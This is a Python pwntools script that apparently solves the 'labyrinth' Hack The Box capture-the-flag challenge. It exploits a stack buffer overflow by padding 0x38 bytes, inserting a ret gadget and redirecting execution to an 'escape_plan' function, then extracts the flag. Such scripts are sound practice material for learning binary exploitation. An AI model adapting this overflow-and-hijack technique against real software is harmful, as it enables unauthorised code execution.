from pwn import *
import sys
import re

# Define the filename for the ELF binary
filename = "./labyrinth"

def get_flag(text, pattern=r'HTB\{.*?\}'):
    """
    Extracts the flag from the provided text using the given pattern.
    
    Args:
        text (str or bytes): The input text containing the flag.
        pattern (str): The regex pattern to search for the flag.
    
    Returns:
        str: The extracted flag.
    """
    if isinstance(text, bytes):
        text = text.decode()
    flag = re.search(pattern, text).group(0)
    success(flag)
    return flag

def get_func(func_name, in_elf=None):
    """
    Retrieves the address of a function from the ELF binary.
    
    Args:
        func_name (str): The name of the function to locate.
        in_elf (ELF): The ELF object to search within. Defaults to the global 'elf' object.
    
    Returns:
        int: The address of the function.
    """
    if not in_elf:
        global elf
        in_elf = elf
    addr = in_elf.symbols[func_name]
    info(f"{func_name}: %#x", addr)
    return addr

# Load the ELF binary
elf = ELF(filename)
context.binary = elf.path

# Set the logging level to DEBUG if 'DEBUG' argument is provided
if args.get('DEBUG'):
    context.log_level = 'DEBUG'

# Establish a connection based on the mode (REMOTE or LOCAL)
if args.get('REMOTE'):
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process(elf.path)
    # Attach GDB if 'GDB' argument is provided
    if args.get('GDB'):
        gdb.attach(p, '''
        ''')

# Initialize ROP and find the return gadget
rop = ROP(elf.path)
ret = rop.find_gadget(["ret"]).address

# Define the payload parameters
offset = 0x38
eip = get_func("escape_plan")

# Construct the payload
payload = flat([{offset: ret}, eip])

# Interact with the process
p.recvuntil(b">>")
p.sendline(b"69")
p.recvuntil(b">>")
p.sendline(payload)

# Receive all output and extract the flag
output = p.recvall()
flag = get_flag(output)

# Save the payload to a file
with open('payload', 'wb') as f:
    f.write(payload)
